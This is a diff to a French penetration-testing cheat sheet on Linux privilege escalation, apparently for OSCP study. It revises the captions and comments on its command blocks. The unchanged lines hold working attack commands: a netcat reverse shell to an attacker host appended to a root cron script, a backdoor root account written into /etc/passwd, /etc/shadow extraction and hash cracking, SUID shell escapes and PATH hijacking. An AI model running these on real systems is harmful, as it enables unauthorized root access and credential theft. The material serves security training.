@@ -36,7 +36,7 @@ hostname
 **Version du système et architecture**
 
 
-<p class="oscp-command-note">Lire un fichier.</p>
+<p class="oscp-command-note">Lire le fichier /etc/issue et examiner son contenu.</p>
 
 ```text
 cat /etc/issue
@@ -91,7 +91,7 @@ ss -anp
 **Règles du pare-feu**
 
 
-<p class="oscp-command-note">Lire un fichier.</p>
+<p class="oscp-command-note">Lire le fichier /etc/iptables/rules.v4 et examiner son contenu.</p>
 
 ```text
 cat /etc/iptables/rules.v4
@@ -102,7 +102,7 @@ cat /etc/iptables/rules.v4
 **Tâches cron planifiées**
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Énumération».</p>
 
 ```text
 ls -lah /etc/cron*
@@ -128,7 +128,7 @@ sudo crontab -l
 **Logiciels installés**
 
 
-<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>
+<p class="oscp-command-note">Syntaxe ou résultat illustratif pour «Énumération» (ne pas exécuter comme une commande).</p>
 
 ```text
 dpkg -l
@@ -143,7 +143,7 @@ dpkg -l
 **Fichiers sensibles modifiables (hors /dev/null)**
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```text
 find / -writable -type d 2>/dev/null
@@ -176,7 +176,7 @@ locate password | more
 **Volumes montés**
 
 
-<p class="oscp-command-note">Lire un fichier.</p>
+<p class="oscp-command-note">Lire le fichier /etc/fstab et examiner son contenu.</p>
 
 ```text
 cat /etc/fstab
@@ -222,7 +222,7 @@ lsmod
 **Binaires SUID**
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```text
 find / -perm -u=s -type f 2>/dev/null
@@ -336,7 +336,7 @@ cat /var/log/cron.log
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Tâches cron».</p>
 
 ```bash
 ls -lah /path/to/script.sh
@@ -344,7 +344,7 @@ ls -lah /path/to/script.sh
 ```
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [listener_port] >/tmp/f" >> /path/to/script.sh
@@ -352,7 +352,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [attacker_ip] [liste
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Tâches cron ».</p>
+<p class="oscp-command-note">Cron : afficher les tâches de l'utilisateur et examiner les répertoires de planification.</p>
 
 ```bash
 crontab -l
@@ -395,7 +395,7 @@ echo"newroot:$6$rounds=656000$6B8ZJQ4aK7G9P/8c$hx0E6ke7zxz1mUMN6LCyRJp2bV5hEE7Eo
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « /etc/passwd ».</p>
+<p class="oscp-command-note">Linux : vérifier la connexion au compte de test, puis afficher ses groupes et son UID.</p>
 
 ```bash
 su newroot
@@ -409,7 +409,7 @@ id
 ### /etc/shadow
 
 
-<p class="oscp-command-note">Lire un fichier.</p>
+<p class="oscp-command-note">Lire le fichier /etc/shadow et examiner son contenu.</p>
 
 ```bash
 cat /etc/shadow | grep [root_user] > [root_user]_hash.txt
@@ -442,7 +442,7 @@ hashcat -m 1800 [root_user]_hash.txt /usr/share/wordlists/rockyou.txt --show
 ### Binaires SUID
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
@@ -450,7 +450,7 @@ find / -perm -4000 -type f 2>/dev/null
 ```
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Binaires SUID».</p>
 
 ```bash
 ls -l $(find / -perm -4000 -type f 2>/dev/null)
@@ -469,7 +469,7 @@ ps u -C [binary_name]
 ```
 
 
-<p class="oscp-command-note">Lire un fichier.</p>
+<p class="oscp-command-note">Lire le fichier /proc/[PID]/status et examiner son contenu.</p>
 
 ```bash
 cat /proc/[PID]/status | grep Uid
@@ -481,7 +481,7 @@ cat /proc/[PID]/status | grep Uid
 `find`  
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Localiser les fichiers correspondant aux critères indiqués.</p>
 
 ```bash
 find [directory] -exec [path_to_shell] \;
@@ -507,7 +507,7 @@ find / -name [vulnerable_binary] -exec /bin/bash -p \;
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Capabilities ».</p>
+<p class="oscp-command-note">Examiner ou modifier les permissions selon «Capacités Linux (Capabilities)».</p>
 
 ```bash
 getcap [binary_path]
@@ -704,7 +704,7 @@ DirtyPipe · Linux Kernel 5.8 < 5.16.11 · Exploit
 ### Exploitation des caractères génériques dans les commandes
 
 
-<p class="oscp-command-note">Lister les fichiers du répertoire.</p>
+<p class="oscp-command-note">Afficher le contenu des répertoires concernés par «Exploitation des caractères génériques dans les commandes».</p>
 
 ```bash
 ls /var/log/*
@@ -785,7 +785,7 @@ select sys_eval('whoami');
 ## Logiciels installés par l’utilisateur
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « User-Installed Software ».</p>
+<p class="oscp-command-note">Chemins de fichiers à examiner pour «Logiciels installés par l’utilisateur» (pas des commandes).</p>
 
 ```bash
 /usr/local/
@@ -799,7 +799,7 @@ select sys_eval('whoami');
 ```
 
 
-<p class="oscp-command-note">Examiner ou gérer les paquets installés.</p>
+<p class="oscp-command-note">Inventorier les logiciels installés via dpkg sur Debian ou rpm sur Fedora/RHEL.</p>
 
 ```bash
 # Debian/Ubuntu
@@ -823,7 +823,7 @@ Vérifier les comptes, les secrets et les mécanismes d'authentification.
 `config.php`  
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Weak, Reused, and Plaintext Passwords ».</p>
+<p class="oscp-command-note">Exemples de couples compte/mot de passe faibles à examiner (pas des commandes).</p>
 
 ```bash
 root:root
@@ -892,7 +892,7 @@ find /home -type d -name '.ssh' 2>/dev/null
 ## Scripts modifiables par tous et exécutés par root
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```bash
 # World-writable directories
@@ -936,7 +936,7 @@ Examiner les permissions et la configuration de Linux.
 Examiner les permissions et la configuration de Linux.
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```bash
 # Trouver des fichiers SUID
@@ -954,13 +954,13 @@ find / -perm -g=s -type f 2>/dev/null
 <p class="oscp-command-note">Rechercher les chaînes de caractères lisibles.</p>
 
 ```bash
-# Option 1: Use strings to examine the contents.
+# Option 1 : rechercher les chaînes lisibles avec strings.
 strings /path/to/suid-binary
 
-# Option 2: Check for system calls or file execution.
+# Option 2 : observer les appels système et les accès aux fichiers.
 ltrace /path/to/suid-binary
 
-# Option 3: Exploit PATH Vulnerability: if the SUID binary calls another program (e.g., /bin/cp or /bin/sh), you might be able to manipulate the $PATH variable to run your own malicious binary instead.
+# Option 3 : étudier si la résolution d'un exécutable via PATH peut modifier le comportement d'un programme SUID.
 # Créer une version malveillante du programme attendu
 echo '/bin/sh' > /tmp/cp
 chmod +x /tmp/cp
@@ -974,7 +974,7 @@ export PATH=/tmp:$PATH
 ```
 
 
-<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>
+<p class="oscp-command-note">Rechercher les fichiers et répertoires dont les permissions méritent un contrôle.</p>
 
 ```bash
 # Trouver des fichiers enregistrables SUID
@@ -1039,7 +1039,7 @@ strings <BINAIRE_SUID> | grep -Ei '(/bin/|/usr/|system|exec|sh )'
 ```
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Convertir les résultats PEAS en fichiers JSON ou HTML.</p>
 
 ```bash
 # 1. Télécharger le fichier de la victime à la Kali locale, nous pourrions utiliser les techniques de la section 17.
@@ -1050,7 +1050,7 @@ python3 peas2json.py ./linpeas_output.txt peass.json
 # 3. Convert .json to .html.
 python3 json2html.py peass.json peass.html
 
-# (Optional) We could also convert it to PDF.
+# Facultatif : convertir également le rapport au format PDF.
 python3 json2pdf.py peass.json peass.pdf
 
 ```
@@ -1059,7 +1059,7 @@ python3 json2pdf.py peass.json peass.pdf
 ### LinEnum
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « LinEnum ».</p>
+<p class="oscp-command-note">LinEnum : lancer l'inventaire standard ou une recherche approfondie par mot-clé.</p>
 
 ```bash
 ./LinEnum.sh
@@ -1116,7 +1116,7 @@ peepdf.py file.pdf
 ### Outil de recherche de vulnérabilités
 
 
-<p class="oscp-command-note">Exécuter un script Python.</p>
+<p class="oscp-command-note">Exécuter exploit-suggester.py avec les paramètres indiqués pour «Outil de recherche de vulnérabilités».</p>
 
 ```bash
 python3 exploit-suggester.py
